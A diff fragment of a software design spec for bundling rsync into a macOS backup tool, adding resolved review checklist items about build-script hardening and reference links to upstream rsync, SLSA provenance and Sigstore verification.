+- [x] QA N4 (otool regex): per-arch call.
+- [x] QA N6 (cross-test sequencing): §6 cross-test paragraph.
+- [x] Senior Dev I1+I2+I3: trap conditional, curl 2>/dev/null dropped, parse-don't-source closes I3.
+- [x] Round-2 Minor 5-min budget enforcement: AC-12a-1 documents target; no CI enforcement (acceptable per Tech Lead Minor 2).
 
 ## 11. References
 
@@ -603,7 +777,11 @@ Multi-hat review (2026-06-06 1900-1930):
 - Existing rsync extraction: `internal/rsync/rsync.go`
 - Existing build script stub: `scripts/build-rsync.sh`
 - Project design spec (Phase rollout, supported macOS): `docs/specs/2026-06-03-1532-flashbackup-design.md`
+- Project design spec invariant #45 (Repository layout) — this spec adds `scripts/rsync.version` and `scripts/rsync.version.attestation` to `scripts/`, reserves `docs/runbooks/` for Task 12d, and reserves Plan 2 artifacts (`scripts/notarize.sh`, `scripts/entitlements.plist`) per the locked layout
+- Existing pathological fixture: `test/fixtures/pathological/mkfixtures.sh` (extended by Task 12b)
+- Existing Makefile build target: `Makefile:63-68` (preserved unchanged)
 - Upstream rsync project: https://github.com/RsyncProject/rsync
 - Upstream rsync downloads: https://download.samba.org/pub/rsync/src/
 - rsync-announce mailing list: https://lists.samba.org/archive/rsync-announce/
 - SLSA build provenance: https://slsa.dev/spec/v1.0/provenance
+- Sigstore cosign verify: https://docs.sigstore.dev/cosign/verifying/verify/
